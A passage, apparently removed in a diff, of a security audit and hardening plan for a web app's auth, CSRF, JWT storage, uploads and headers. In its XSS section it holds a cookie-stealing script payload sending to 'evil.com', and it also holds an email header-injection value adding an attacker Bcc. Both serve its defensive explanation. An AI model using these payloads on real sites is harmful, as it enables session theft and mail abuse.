-   - Stripe events can be replayed if not tracked
-   - **Recommendation**: Store processed event IDs
-
-2. **Race Conditions**: ⚠️
-   - Multiple webhooks for same event
-   - **Recommendation**: Idempotency keys
-
-3. **Secret Exposure**:
-   ```javascript
-   const STRIPE_SECRET_KEY = process.env.STRIPE_SECRET_KEY || '';
-   ```
-   - ✅ Uses environment variables (good)
-   - ⚠️ Empty string fallback (should fail fast)
-
----
-
-#### B. Google OAuth
-
-**Current Status**: CSRF protection via `state` parameter ✅
-
-**Concerns:**
-1. **Redirect URI Validation**: Must be exact match
-2. **Token Storage**: Where are OAuth tokens stored?
-3. **Scope Creep**: Only request minimum required scopes
-
----
-
-#### C. Email Service (Resend)
-
-**Current Implementation:**
-
-```javascript
-const resend = new Resend(process.env.RESEND_API_KEY);
-
-await resend.emails.send({
-  from: 'noreply@sitesprintz.com',
-  to: userEmail,
-  subject: 'Welcome',
-  html: emailTemplate
-});
-```
-
-**Vulnerabilities:**
-
-1. **Email Injection**: ⚠️
-   ```javascript
-   // If user controls 'to' field:
-   to: "victim@test.com\nBcc: attacker@evil.com"
-   ```
-   **Status**: Check if `userEmail` is validated
-
-2. **HTML Injection in Emails**: ⚠️
-   - If email templates include user data
-   - Can lead to phishing
-
-3. **Rate Limiting**: ✅
-   - 3,000 emails/month on free tier
-   - Natural rate limit
-
----
-
-### 2.3 Session and Authentication
-
-#### A. JWT Token Management
-
-**Current Implementation:**
-
-```836:841:server.js
-    const token = jwt.sign({ 
-      userId: user.id,
-      id: user.id, // For compatibility
-      email: user.email, 
-      role: user.role
-    }, JWT_SECRET, { expiresIn: '7d' });
-```
-
-**Strengths:**
-- ✅ 7-day expiration
-- ✅ Signed with secret
-
-**Vulnerabilities:**
-
-1. **JWT Secret Strength**:
-   ```4:4:server/middleware/auth.js
-const JWT_SECRET = process.env.JWT_SECRET || 'your-secret-key-change-in-production';
-```
-   - ⚠️ Weak default (development)
-   - ✅ Should be strong in production
-
-2. **No Token Revocation**: ⚠️
-   - JWTs can't be invalidated until expiration
-   - **Issue**: Compromised tokens valid for 7 days
-   - **Recommendation**: Token blacklist or short-lived tokens + refresh tokens
-
-3. **Token Storage**:
-   ```17:18:src/context/AuthContext.jsx
-    const storedToken = localStorage.getItem('authToken');
-```
-   - ⚠️ `localStorage` is vulnerable to XSS
-   - **Recommendation**: Use `httpOnly` cookies
-
-4. **No CSRF Protection on Auth Endpoints**: 🚨
-   ```107:112:server/middleware/csrf.js
-  // Temporarily skip CSRF validation for auth endpoints (until cookie-parser is properly configured)
-  console.log('CSRF Check - Path:', req.path, 'Method:', method);
-  if (req.path.startsWith('/api/auth/') || req.path.startsWith('/auth/')) {
-    console.log('✅ Skipping CSRF for auth endpoint');
-    return next();
-  }
-```
-   - 🚨 **CRITICAL**: Auth endpoints bypass CSRF
-   - 🚨 **PRODUCTION BLOCKER**
-
----
-
-#### B. Session Management
-
-**Current Status**: Using `express-session`
-
-**Configuration** (needs verification):
-```javascript
-app.use(session({
-  secret: process.env.SESSION_SECRET,
-  resave: false,
-  saveUninitialized: false,
-  cookie: {
-    httpOnly: true,
-    secure: process.env.NODE_ENV === 'production',
-    sameSite: 'lax',
-    maxAge: 24 * 60 * 60 * 1000  // 24 hours
-  }
-}));
-```
-
-**Vulnerabilities:**
-
-1. **Session Fixation**: ⚠️
-   - Are session IDs regenerated after login?
-   - **Check**: `req.session.regenerate()` usage
-
-2. **Session Storage**: ⚠️
-   - In-memory storage (lost on restart)
-   - **Recommendation**: Redis for production
-
----
-
-### 2.4 Access Control
-
-#### A. Authorization Checks
-
-**Admin Endpoints:**
-
-```13:73:server/middleware/auth.js
-export async function requireAdmin(req, res, next) {
-  const authHeader = req.headers['authorization'];
-  const token = authHeader && authHeader.split(' ')[1];
-  
-  if (!token) {
-    return res.status(401).json({ error: 'No token provided' });
-  }
-  
-  try {
-    // Step 1: Verify JWT token
-    const decoded = jwt.verify(token, JWT_SECRET);
-    
-    // Step 2: Get fresh user data from database
-    const result = await dbQuery(
-      'SELECT id, email, role, status, subscription_status, subscription_plan FROM users WHERE id = $1',
-      [decoded.userId || decoded.id]
-    );
-    
-    if (result.rows.length === 0) {
-      return res.status(401).json({ error: 'User not found' });
-    }
-    
-    const user = result.rows[0];
-    
-    // Step 3: Check if user account is active
-    if (user.status !== 'active') {
-      return res.status(403).json({ error: 'Account is suspended' });
-    }
-    
-    // Step 4: Check if user is admin
-    if (user.role !== 'admin') {
-      return res.status(403).json({
-        error: 'Admin access required',
-        message: 'You do not have permission to access this resource'
-      });
-    }
-    
-    // Step 5: Attach user to request
-    req.user = {
-      id: user.id,
-      userId: user.id,
-      email: user.email,
-      role: user.role,
-      status: user.status,
-      subscriptionStatus: user.subscription_status,
-      subscriptionPlan: user.subscription_plan
-    };
-    
-    next();
-    
-  } catch (err) {
-    if (err.name === 'JsonWebTokenError') {
-      return res.status(401).json({ error: 'Invalid token' });
-    }
-    if (err.name === 'TokenExpiredError') {
-      return res.status(401).json({ error: 'Token expired' });
-    }
-    console.error('Admin auth error:', err);
-
-    return res.status(500).json({ error: 'Authentication failed' });
-  }
-}
-```
-
-**Strengths:**
-- ✅ Fetches fresh user data from DB (not just JWT)
-- ✅ Checks account status
-- ✅ Role-based access control
-
-**Potential Issues:**
-
-1. **Insecure Direct Object Reference (IDOR)**: ⚠️
-   ```javascript
-   // Can user access/modify OTHER users' sites?
-   GET /api/sites/:siteId
-   ```
-   **Check**: Does the endpoint verify ownership?
-
-2. **Horizontal Privilege Escalation**: ⚠️
-   ```javascript
-   // User A modifies User B's site
-   PUT /api/sites/user-b-site-id
-   ```
-   **Recommendation**: Verify `req.user.id === site.ownerId`
-
----
-
-## 3. 🛡️ DEFENSE IMPLEMENTATION PLAN
-
-### 3.1 CRITICAL: Fix Visual Editor XSS
-
-**Priority**: P0 🔴  
-**Severity**: CRITICAL  
-**Impact**: All generated sites vulnerable
-
-#### Problem
-
-Users can inject malicious HTML/JS through the visual editor:
-
-```javascript
-{
-  "sections": [
-    {
-      "type": "html",
-      "content": "<script>fetch('https://evil.com/steal?cookie='+document.cookie)</script>"
-    }
-  ]
-}
-```
-
-#### Solution: Content Security Policy + Sanitization
-
-**Step 1: Server-Side HTML Sanitization**
-
-```javascript
-// server/utils/htmlSanitizer.js
-import DOMPurify from 'isomorphic-dompurify';
-
-export function sanitizeUserHTML(html, options = {}) {
-  const config = {
-    ALLOWED_TAGS: [
-      'h1', 'h2', 'h3', 'h4', 'h5', 'h6',
-      'p', 'br', 'span', 'div', 'section',
-      'a', 'img', 'ul', 'ol', 'li',
-      'strong', 'em', 'u', 'table', 'tr', 'td', 'th',
-      ...options.additionalTags || []
-    ],
-    ALLOWED_ATTR: [
-      'href', 'src', 'alt', 'title', 'class', 'id',
-      'width', 'height', 'style'  // Be careful with style
-    ],
-    ALLOWED_URI_REGEXP: /^(?:(?:https?|mailto|tel):)/i,
-    FORBID_TAGS: ['script', 'iframe', 'embed', 'object'],
-    FORBID_ATTR: ['onerror', 'onclick', 'onload', 'onmouseover'],
-    ALLOW_DATA_ATTR: false
-  };
-
-  return DOMPurify.sanitize(html, config);
-}
-```
-
-**Step 2: Apply to Site Generation**
-
-```javascript
-// server/services/siteService.js
-import { sanitizeUserHTML } from '../utils/htmlSanitizer.js';
-
-export async function saveSite(userId, siteData) {
-  // Sanitize ALL user-generated HTML content
-  const sanitizedSections = siteData.sections.map(section => {
-    if (section.type === 'html' || section.content) {
-      return {
-        ...section,
-        content: sanitizeUserHTML(section.content)
-      };
-    }
-    return section;
-  });
-
-  const sanitizedData = {
-    ...siteData,
-    sections: sanitizedSections
-  };
-
-  // Save to database
-  return await prisma.site.create({
-    data: {
-      userId,
-      data: sanitizedData
-    }
-  });
-}
-```
-
-**Step 3: Content Security Policy Headers**
-
-```javascript
-// server.js - for generated sites
-app.use('/sites/:subdomain', (req, res, next) => {
-  res.setHeader('Content-Security-Policy', [
-    "default-src 'self'",
-    "script-src 'self' 'unsafe-inline' https://js.stripe.com",  // Only trusted CDNs
-    "style-src 'self' 'unsafe-inline'",
-    "img-src 'self' data: https:",
-    "font-src 'self' data:",
-    "connect-src 'self' https://api.stripe.com",
-    "frame-src https://js.stripe.com",
-    "object-src 'none'",
-    "base-uri 'self'"
-  ].join('; '));
-  
-  next();
-});
-```
-
-**Dependencies:**
-```json
-{
-  "dependencies": {
-    "isomorphic-dompurify": "^2.0.0"
-  }
-}
-```
-
----
-
-### 3.2 HIGH: Fix CSRF Protection
-
-**Priority**: P0 🔴  
-**Severity**: HIGH  
-**Impact**: Authentication endpoints vulnerable
-
-#### Current Issue
-
-```107:112:server/middleware/csrf.js
-  // Temporarily skip CSRF validation for auth endpoints (until cookie-parser is properly configured)
-  console.log('CSRF Check - Path:', req.path, 'Method:', method);
-  if (req.path.startsWith('/api/auth/') || req.path.startsWith('/auth/')) {
-    console.log('✅ Skipping CSRF for auth endpoint');
-    return next();
-  }
-```
-
-**🚨 PRODUCTION BLOCKER**: Authentication bypass
-
-#### Solution
-
-**Step 1: Install cookie-parser**
-
-```bash
-npm install cookie-parser
-```
-
-**Step 2: Configure cookie-parser**
-
-```javascript
-// server.js
-import cookieParser from 'cookie-parser';
-
-app.use(cookieParser());  // BEFORE bodyParser
-app.use(bodyParser.json());
-```
-
-**Step 3: Remove CSRF bypass**
-
-```javascript
-// server/middleware/csrf.js
-export function csrfProtection(req, res, next) {
-  const method = req.method.toUpperCase();
-  
-  // Skip CSRF validation for safe methods
-  if (['GET', 'HEAD', 'OPTIONS'].includes(method)) {
-    return next();
-  }
-  
-  // Skip CSRF validation for webhook endpoints (signature-verified)
-  if (req.path.startsWith('/api/webhooks/')) {
-    return next();
-  }
-  
-  // ❌ REMOVE THIS:
-  // if (req.path.startsWith('/api/auth/')) {
-  //   return next();
-  // }
-  
-  // Validate CSRF token for ALL state-changing requests
-  try {
-    const sessionId = req.cookies?.sessionId;
-    const clientToken = req.headers['x-csrf-token'];
-    
-    if (!sessionId || !clientToken) {
-      return res.status(403).json({ 
-        error: 'Invalid CSRF token',
-        code: 'CSRF_INVALID'
-      });
-    }
-    
-    const storedToken = csrfTokens.get(sessionId);
-    if (!storedToken || !crypto.timingSafeEqual(
-      Buffer.from(clientToken),
-      Buffer.from(storedToken)
-    )) {
-      return res.status(403).json({ 
-        error: 'Invalid CSRF token',
-        code: 'CSRF_INVALID'
-      });
-    }
-    
-    next();
-  } catch (error) {
-    console.error('CSRF validation error:', error);
-    return res.status(500).json({ error: 'CSRF validation failed' });
-  }
-}
-```
-
-**Step 4: Frontend - Fetch CSRF Token**
-
-```javascript
-// src/services/api.js
-class APIClient {
-  constructor() {
-    this.csrfToken = null;
-  }
-
-  async ensureCSRFToken() {
-    if (!this.csrfToken) {
-      const response = await fetch('/api/csrf-token', {
-        credentials: 'include'  // Include cookies
-      });
-      const data = await response.json();
-      this.csrfToken = data.csrfToken;
-    }
-  }
-
-  async request(endpoint, options = {}) {
-    // Fetch CSRF token for state-changing requests
-    if (['POST', 'PUT', 'PATCH', 'DELETE'].includes(options.method?.toUpperCase())) {
-      await this.ensureCSRFToken();
-      options.headers = {
-        ...options.headers,
-        'X-CSRF-Token': this.csrfToken
-      };
-    }
-
-    options.credentials = 'include';  // Always send cookies
-    
-    const response = await fetch(endpoint, options);
-    return response;
-  }
-}
-```
-
----
-
-### 3.3 HIGH: Secure JWT Token Storage
-
-**Priority**: P1 🟠  
-**Severity**: HIGH  
-**Impact**: XSS can steal tokens
-
-#### Current Issue
-
-```17:18:src/context/AuthContext.jsx
-    const storedToken = localStorage.getItem('authToken');
-```
-
-**Vulnerability**: `localStorage` is accessible via JavaScript  
-**Attack**: XSS → `localStorage.getItem('authToken')` → Full account takeover
-
-#### Solution: HttpOnly Cookies
-
-**Step 1: Server - Set JWT in HttpOnly Cookie**
-
-```javascript
-// server.js - Login endpoint
-app.post('/api/auth/login', async (req, res) => {
-  // ... validate credentials ...
-  
-  const token = jwt.sign({ 
-    userId: user.id,
-    email: user.email, 
-    role: user.role
-  }, JWT_SECRET, { expiresIn: '7d' });
-  
-  // Set JWT in httpOnly cookie (NOT accessible via JavaScript)
-  res.cookie('authToken', token, {
-    httpOnly: true,  // Prevents JavaScript access
-    secure: process.env.NODE_ENV === 'production',  // HTTPS only
-    sameSite: 'strict',  // CSRF protection
-    maxAge: 7 * 24 * 60 * 60 * 1000  // 7 days
-  });
-  
-  // Return user data (but NOT the token)
-  res.json({ 
-    success: true, 
-    user: { 
-      id: user.id, 
-      email: user.email, 
-      role: user.role
-    } 
-  });
-});
-```
-
-**Step 2: Server - Read JWT from Cookie**
-
-```javascript
-// server/middleware/auth.js
-export async function requireAuth(req, res, next) {
-  // Try Authorization header first (for API clients)
-  let token = req.headers['authorization']?.split(' ')[1];
-  
-  // Fallback to cookie (for browser clients)
-  if (!token) {
-    token = req.cookies?.authToken;
-  }
-  
-  if (!token) {
-    return res.status(401).json({ error: 'No token provided' });
-  }
-  
-  try {
-    const decoded = jwt.verify(token, JWT_SECRET);
-    // ... rest of auth logic ...
-  } catch (err) {
-    return res.status(401).json({ error: 'Invalid token' });
-  }
-}
-```
-
-**Step 3: Frontend - Remove localStorage**
-
-```javascript
-// src/context/AuthContext.jsx
-export function AuthProvider({ children }) {
-  const [user, setUser] = useState(null);
-  const [loading, setLoading] = useState(true);
-
-  // Check auth status on mount
-  useEffect(() => {
-    checkAuth();
-  }, []);
-
-  const checkAuth = async () => {
-    try {
-      // No need to send token - it's in httpOnly cookie
-      const response = await fetch('/api/auth/user', {
-        credentials: 'include'  // Include cookies
-      });
-      
-      if (response.ok) {
-        const userData = await response.json();
-        setUser(userData.user);
-      }
-    } catch (error) {
-      console.error('Auth check failed:', error);
-    } finally {
-      setLoading(false);
-    }
-  };
-
-  const login = async (email, password) => {
-    const response = await fetch('/api/auth/login', {
-      method: 'POST',
-      headers: { 'Content-Type': 'application/json' },
-      credentials: 'include',  // Include cookies
-      body: JSON.stringify({ email, password })
-    });
-    
-    const data = await response.json();
-    if (data.success) {
-      setUser(data.user);
-      // No localStorage.setItem('authToken', data.token)
-    }
-    return data;
-  };
-
-  const logout = async () => {
-    await fetch('/api/auth/logout', {
-      method: 'POST',
-      credentials: 'include'
-    });
-    setUser(null);
-    // No localStorage.removeItem('authToken')
-  };
-
-  // ... rest of context ...
-}
-```
-
-**Step 4: Logout - Clear Cookie**
-
-```javascript
-// server.js
-app.post('/api/auth/logout', (req, res) => {
-  res.clearCookie('authToken', {
-    httpOnly: true,
-    secure: process.env.NODE_ENV === 'production',
-    sameSite: 'strict'
-  });
-  res.json({ success: true });
-});
-```
-
----
-
-### 3.4 MEDIUM: Add Security Headersp
-
-**Priority**: P1 🟠  
-**Severity**: MEDIUM  
-**Impact**: Defense in depth
-
-#### Helmet Configuration
-
-```javascript
-// server.js
-import helmet from 'helmet';
-
-app.use(helmet({
-  contentSecurityPolicy: {
-    directives: {
-      defaultSrc: ["'self'"],
-      scriptSrc: [
-        "'self'",
-        // Only allow specific CDNs
-        "https://js.stripe.com",
-        "https://www.google.com/recaptcha/",
-        "'unsafe-inline'"  // Required for inline scripts (minimize usage)
-      ],
-      styleSrc: [
-        "'self'", 
-        "'unsafe-inline'",  // For inline styles
-        "https://fonts.googleapis.com"
-      ],
-      imgSrc: [
-        "'self'",
-        "data:",
-        "https:",  // Allow images from any HTTPS source
-        "blob:"
-      ],
-      fontSrc: [
-        "'self'",
-        "https://fonts.gstatic.com"
-      ],
-      connectSrc: [
-        "'self'",
-        "https://api.stripe.com",
-        "https://api.resend.com"
-      ],
-      frameSrc: [
-        "https://js.stripe.com",  // Stripe checkout
-        "https://www.google.com/recaptcha/"
-      ],
-      objectSrc: ["'none'"],
-      upgradeInsecureRequests: []
-    }
-  },
-  
-  // Remove X-Powered-By header
-  hidePoweredBy: true,
-  
-  // Prevent clickjacking
-  frameguard: {
-    action: 'deny'  // or 'sameorigin'
-  },
-  
-  // Force HTTPS
-  hsts: {
-    maxAge: 31536000,  // 1 year
-    includeSubDomains: true,
-    preload: true
-  },
-  
-  // Prevent MIME sniffing
-  noSniff: true,
-  
-  // XSS Protection (legacy, but doesn't hurt)
-  xssFilter: true,
-  
-  // Referrer Policy
-  referrerPolicy: {
-    policy: 'strict-origin-when-cross-origin'
-  }
-}));
-```
-
----
-
-### 3.5 MEDIUM: Add Rate Limiting
-
-**Priority**: P2 🟡  
-**Severity**: MEDIUM  
-**Impact**: Prevents brute force, DoS
-
-#### Enhanced Rate Limiting
-
-```javascript
-// server/middleware/rateLimiting.js
-import rateLimit from 'express-rate-limit';
-import RedisStore from 'rate-limit-redis';
-import redis from 'redis';
-
-// Redis client (for distributed rate limiting)
-const redisClient = redis.createClient({
-  url: process.env.REDIS_URL || 'redis://localhost:6379'
-});
-
-// General API rate limit
-export const apiLimiter = rateLimit({
-  store: new RedisStore({
-    client: redisClient,
-    prefix: 'rl:api:'
-  }),
-  windowMs: 15 * 60 * 1000,  // 15 minutes
-  max: 100,  // 100 requests per 15 minutes
-  message: 'Too many requests, please try again later.',
-  standardHeaders: true,
-  legacyHeaders: false
-});
-
-// Strict rate limit for authentication
-export const authLimiter = rateLimit({
-  store: new RedisStore({
-    client: redisClient,
-    prefix: 'rl:auth:'
-  }),
-  windowMs: 15 * 60 * 1000,  // 15 minutes
-  max: 5,  // 5 attempts per 15 minutes
-  skipSuccessfulRequests: true,  // Don't count successful logins
-  message: 'Too many login attempts, please try again later.',
-  standardHeaders: true,
-  legacyHeaders: false
-});
-
-// File upload rate limit
-export const uploadLimiter = rateLimit({
-  store: new RedisStore({
-    client: redisClient,
-    prefix: 'rl:upload:'
-  }),
-  windowMs: 60 * 60 * 1000,  // 1 hour
-  max: 50,  // 50 uploads per hour
-  message: 'Upload limit exceeded, please try again later.'
-});
-
-// Webhook rate limit (per subdomain)
-export const webhookLimiter = rateLimit({
-  windowMs: 5 * 60 * 1000,  // 5 minutes
-  max: 100,  // 100 webhooks per 5 minutes (Stripe sends bursts)
-  keyGenerator: (req) => {
-    // Rate limit by Stripe account ID (from signature)
-    return req.stripeAccount || req.ip;
-  }
-});
-```
-
-**Apply to Routes:**
-
-```javascript
-// server.js
-import { apiLimiter, authLimiter, uploadLimiter } from './server/middleware/rateLimiting.js';
-
-// Apply to all API routes
-app.use('/api/', apiLimiter);
-
-// Stricter limit for auth
-app.use('/api/auth/login', authLimiter);
-app.use('/api/auth/register', authLimiter);
-
-// Upload limit
-app.use('/api/upload', uploadLimiter);
-```
-
-**Dependencies:**
-```bash
-npm install rate-limit-redis redis
-```
-
----
-
-### 3.6 MEDIUM: Improve File Upload Security
-
-**Priority**: P2 🟡  
-**Severity**: MEDIUM  
-**Impact**: Prevent malicious file uploads
-
-#### Enhanced File Validation
-
-```javascript
-// server/utils/fileValidator.js
-import fs from 'fs/promises';
-import { fileTypeFromBuffer } from 'file-type';
-import sharp from 'sharp';  // Already installed
-
-/**
- * Validate uploaded file is actually an image
- * Checks magic bytes, not just extension/MIME type
- */
-export async function validateImageFile(filePath) {
-  try {
-    // Read first 4100 bytes (enough for file-type detection)
-    const buffer = await fs.readFile(filePath);
-    
-    // Check magic bytes
-    const fileType = await fileTypeFromBuffer(buffer);
-    
-    if (!fileType) {
-      throw new Error('Unable to determine file type');
-    }
-    
-    // Whitelist of allowed image types
-    const allowedTypes = ['image/jpeg', 'image/png', 'image/gif', 'image/webp'];
-    
-    if (!allowedTypes.includes(fileType.mime)) {
-      throw new Error(`Invalid file type: ${fileType.mime}`);
-    }
-    
-    // Additional validation: try to parse as image
-    try {
-      const metadata = await sharp(filePath).metadata();
-      
-      // Check reasonable dimensions (prevent decompression bombs)
-      if (metadata.width > 10000 || metadata.height > 10000) {
-        throw new Error('Image dimensions too large');
-      }
-      
-      // Check pixel count (prevent massive images)
-      if (metadata.width * metadata.height > 100000000) {  // 100MP
-        throw new Error('Image too large');
-      }
-      
-    } catch (err) {
-      throw new Error('Invalid image file: ' + err.message);
-    }
-    
-    return true;
-    
-  } catch (error) {
-    throw new Error('File validation failed: ' + error.message);
-  }
-}
-
-/**
- * Strip EXIF data from images (privacy + security)
- */
-export async function sanitizeImage(inputPath, outputPath) {
-  try {
-    await sharp(inputPath)
-      .rotate()  // Auto-rotate based on EXIF
-      .withMetadata({ exif: {}, icc: {} })  // Strip EXIF but keep color profile
-      .toFile(outputPath);
-    
-    return true;
-  } catch (error) {
-    throw new Error('Image sanitization failed: ' + error.message);
-  }
-}
-```
-
-**Apply to Upload Route:**
-
-```javascript
-// server/routes/uploads.routes.js
-import { validateImageFile, sanitizeImage } from '../utils/fileValidator.js';
-import path from 'path';
-import fs from 'fs/promises';
-
-router.post('/', requireAuth, (req, res) => {
-  upload.single('image')(req, res, async (err) => {
-    if (err) {
-      return res.status(400).json({ error: err.message });
-    }
-    
-    if (!req.file) {
-      return res.status(400).json({ error: 'No file uploaded' });
-    }
-    
-    try {
-      // Validate file is actually an image (magic bytes)
-      await validateImageFile(req.file.path);
-      
-      // Sanitize image (strip EXIF)
-      const sanitizedPath = req.file.path + '.sanitized';
-      await sanitizeImage(req.file.path, sanitizedPath);
-      
-      // Replace original with sanitized
-      await fs.unlink(req.file.path);
-      await fs.rename(sanitizedPath, req.file.path);
-      
-      res.json({ 
-        success: true, 
-        url: `/uploads/${req.file.filename}`
-      });
-      
-    } catch (error) {
-      // Delete invalid file
-      await fs.unlink(req.file.path).catch(() => {});
-      
-      console.error('File validation error:', error);
-      return res.status(400).json({ 
-        error: 'Invalid file',
-        message: error.message
-      });
-    }
-  });
-});
-```
-
-**Dependencies:**
-```bash
-npm install file-type
-# sharp already installed ✅
-```
-
----
-
-### 3.7 LOW: Add Security Monitoring
-
-**Priority**: P3 🟢  
-**Severity**: LOW  
-**Impact**: Detect attacks in progress
-
-#### Security Event Logging
-
-```javascript
-// server/utils/securityLogger.js
-import winston from 'winston';  // Already installed
-
-const securityLogger = winston.createLogger({
-  level: 'info',
-  format: winston.format.combine(
-    winston.format.timestamp(),
-    winston.format.json()
-  ),
-  transports: [
-    new winston.transports.File({ 
-      filename: 'logs/security.log',
-      maxsize: 10485760,  // 10MB
-      maxFiles: 5
-    }),
-    new winston.transports.Console({
-      format: winston.format.simple()
-    })
-  ]
-});
-
-export function logSecurityEvent(event) {
-  securityLogger.warn({
-    type: 'security_event',
-    event: event.type,
-    severity: event.severity,
-    userId: event.userId,
-    ip: event.ip,
-    userAgent: event.userAgent,
-    details: event.details,
-    timestamp: new Date().toISOString()
-  });
-}
-
-// Predefined event types
-export const SecurityEvents = {
-  // Authentication
-  LOGIN_FAILED: 'login_failed',
-  LOGIN_SUCCESS: 'login_success',
-  LOGOUT: 'logout',
-  TOKEN_EXPIRED: 'token_expired',
-  TOKEN_INVALID: 'token_invalid',
-  
-  // Authorization
-  UNAUTHORIZED_ACCESS: 'unauthorized_access',
-  PERMISSION_DENIED: 'permission_denied',
-  
-  // Input Validation
-  VALIDATION_FAILED: 'validation_failed',
-  XSS_ATTEMPT: 'xss_attempt',
-  SQL_INJECTION_ATTEMPT: 'sql_injection_attempt',
-  
-  // Rate Limiting
-  RATE_LIMIT_EXCEEDED: 'rate_limit_exceeded',
-  
-  // File Operations
-  UPLOAD_INVALID: 'upload_invalid',
-  UPLOAD_TOO_LARGE: 'upload_too_large',
-  
-  // CSRF
-  CSRF_TOKEN_INVALID: 'csrf_token_invalid',
-  CSRF_TOKEN_MISSING: 'csrf_token_missing',
-  
-  // Webhooks
-  WEBHOOK_SIGNATURE_INVALID: 'webhook_signature_invalid'
-};
-```
-
-**Integrate with Middleware:**
-
-```javascript
-// server/middleware/auth.js
-import { logSecurityEvent, SecurityEvents } from '../utils/securityLogger.js';
-
-export async function requireAuth(req, res, next) {
-  const token = req.headers['authorization']?.split(' ')[1];
-  
-  if (!token) {
-    logSecurityEvent({
-      type: SecurityEvents.UNAUTHORIZED_ACCESS,
-      severity: 'medium',
-      ip: req.ip,
-      userAgent: req.get('user-agent'),
-      details: { endpoint: req.path }
-    });
-    return res.status(401).json({ error: 'No token provided' });
-  }
-  
-  try {
-    const decoded = jwt.verify(token, JWT_SECRET);
-    // ... success ...
-  } catch (err) {
-    if (err.name === 'TokenExpiredError') {
-      logSecurityEvent({
-        type: SecurityEvents.TOKEN_EXPIRED,
-        severity: 'low',
-        ip: req.ip,
-        details: { endpoint: req.path }
-      });
-    } else {
-      logSecurityEvent({
-        type: SecurityEvents.TOKEN_INVALID,
-        severity: 'high',  // Possible attack
-        ip: req.ip,
-        details: { endpoint: req.path, error: err.message }
-      });
-    }
-    return res.status(401).json({ error: 'Invalid token' });
-  }
-}
-```
-
----
-
-## 4. 🎯 PRIORITIZED IMPLEMENTATION PLAN
-
-### Phase 1: CRITICAL - Production Blockers (Week 1)
-
-**Must be completed before production launch**
-
-| Priority | Task | Files to Change | Severity | Effort |
-|----------|------|----------------|----------|--------|
-| P0-1 | Fix CSRF Protection | `server.js`, `server/middleware/csrf.js`, `src/services/api.js` | CRITICAL | 4h |
-| P0-2 | Visual Editor XSS Prevention | `server/services/siteService.js`, `server/utils/htmlSanitizer.js` | CRITICAL | 8h |
-| P0-3 | Secure JWT Storage (HttpOnly Cookies) | `server.js`, `server/middleware/auth.js`, `src/context/AuthContext.jsx` | HIGH | 6h |
-| P0-4 | Add Security Headers (Helmet) | `server.js` | MEDIUM | 2h |
-
-**Total Effort: 20 hours (2.5 days)**
-
----
-
-### Phase 2: HIGH - Essential Security (Week 2)
-
-| Priority | Task | Files to Change | Severity | Effort |
-|----------|------|----------------|----------|--------|
-| P1-1 | Enhanced Rate Limiting | `server/middleware/rateLimiting.js`, `server.js` | MEDIUM | 4h |
-| P1-2 | Ownership Verification (IDOR) | `server/routes/sites.routes.js`, add ownership checks | HIGH | 6h |
-| P1-3 | Improved File Upload Validation | `server/utils/fileValidator.js`, `server/routes/uploads.routes.js` | MEDIUM | 4h |
-| P1-4 | Session Regeneration on Login | `server.js` (auth endpoints) | MEDIUM | 2h |
-| P1-5 | Stripe Webhook Idempotency | `server.js` (webhook handler) | MEDIUM | 3h |
-
-**Total Effort: 19 hours (2.5 days)**
-
----
-
-### Phase 3: MEDIUM - Defense in Depth (Week 3)
-
-| Priority | Task | Files to Change | Severity | Effort |
-|----------|------|----------------|----------|--------|
-| P2-1 | Security Event Logging | `server/utils/securityLogger.js`, integrate across middleware | LOW | 6h |
-| P2-2 | Dependency Vulnerability Scanning | CI/CD pipeline, GitHub Actions | LOW | 3h |
-| P2-3 | Email Injection Prevention | `server/services/emailService.js` | LOW | 2h |
-| P2-4 | Environment Variable Validation | `server.js` (startup checks) | LOW | 2h |
-| P2-5 | Add Token Blacklist (JWT Revocation) | `server/utils/tokenBlacklist.js`, Redis | MEDIUM | 8h |
-
-**Total Effort: 21 hours (2.5 days)**
-
----
-
-### Phase 4: LOW - Monitoring & Compliance (Week 4)
-
-| Priority | Task | Files to Change | Severity | Effort |
-|----------|------|----------------|----------|--------|
-| P3-1 | Implement Audit Logs | `server/services/auditService.js` | LOW | 6h |
-| P3-2 | GDPR Compliance (Data Export/Delete) | `server/routes/user.routes.js` | LOW | 8h |
-| P3-3 | Security Documentation | `docs/security/` | LOW | 4h |
-| P3-4 | Penetration Testing Preparation | Various | LOW | 4h |
-| P3-5 | Incident Response Plan | `docs/security/INCIDENT-RESPONSE.md` | LOW | 3h |
-
-**Total Effort: 25 hours (3 days)**
-
----
-
-## 5. 📋 TESTING STRATEGY
-
-### 5.1 Security Testing Checklist
-
-#### A. Authentication & Authorization
-
-```bash
-# Test 1: JWT Token Storage
-✅ Tokens in httpOnly cookies (not localStorage)
-✅ Tokens expire after 7 days
-✅ Expired tokens rejected
-✅ Invalid tokens rejected
-✅ No token provided → 401 Unauthorized
-
-# Test 2: CSRF Protection
-✅ CSRF token required for POST/PUT/DELETE
-✅ Missing CSRF token → 403 Forbidden
-✅ Invalid CSRF token → 403 Forbidden
-✅ CSRF token tied to session
-✅ GET requests don't require CSRF
-
-# Test 3: Authorization
-✅ Admin endpoints require admin role
-✅ Users can only access their own sites (IDOR test)
-✅ Suspended accounts blocked
-✅ Role changes take effect immediately
-```
-
-#### B. Input Validation
-
-```bash
-# Test 4: XSS Prevention
-✅ Script tags removed from site content
-✅ Event handlers (onclick, etc.) removed
-✅ javascript: URLs blocked
-✅ data: URLs handled safely
-✅ CSP headers present on generated sites
-
-# Test 5: SQL Injection
-✅ All database queries use parameterization (Prisma)
-✅ No raw SQL with string interpolation
-✅ Special characters in input don't cause errors
-
-# Test 6: File Upload Security
-✅ Only images allowed (magic bytes checked)
-✅ File size limits enforced (10MB)
-✅ EXIF data stripped
-✅ Files stored with random names
-✅ Path traversal prevented
-```
-
-#### C. Rate Limiting
-
-```bash
-# Test 7: Brute Force Protection
-✅ Login limited to 5 attempts per 15 minutes
-✅ API limited to 100 requests per 15 minutes
-✅ Uploads limited to 50 per hour
-✅ Rate limits return 429 Too Many Requests
-✅ Rate limits reset after time window
-```
-
-#### D. Third-Party Integration Security
-
-```bash
-# Test 8: Stripe Webhooks
-✅ Signature verification enabled
-✅ Invalid signatures rejected
-✅ Duplicate events handled (idempotency)
-✅ Webhook endpoint rate limited
-
-# Test 9: Google OAuth
-✅ State parameter prevents CSRF
-✅ Redirect URI validated
-✅ Only required scopes requested
-✅ Tokens stored securely
-```
-
-### 5.2 Automated Security Testing
-
-#### A. Dependency Scanning
-
-```yaml
-# .github/workflows/security.yml
-name: Security Scan
-
-on:
-  push:
-    branches: [main, staging]
-  pull_request:
-  schedule:
-    - cron: '0 0 * * 0'  # Weekly
-
-jobs:
-  security:
-    runs-on: ubuntu-latest
-    steps:
-      - uses: actions/checkout@v3
-      
-      - name: Setup Node.js
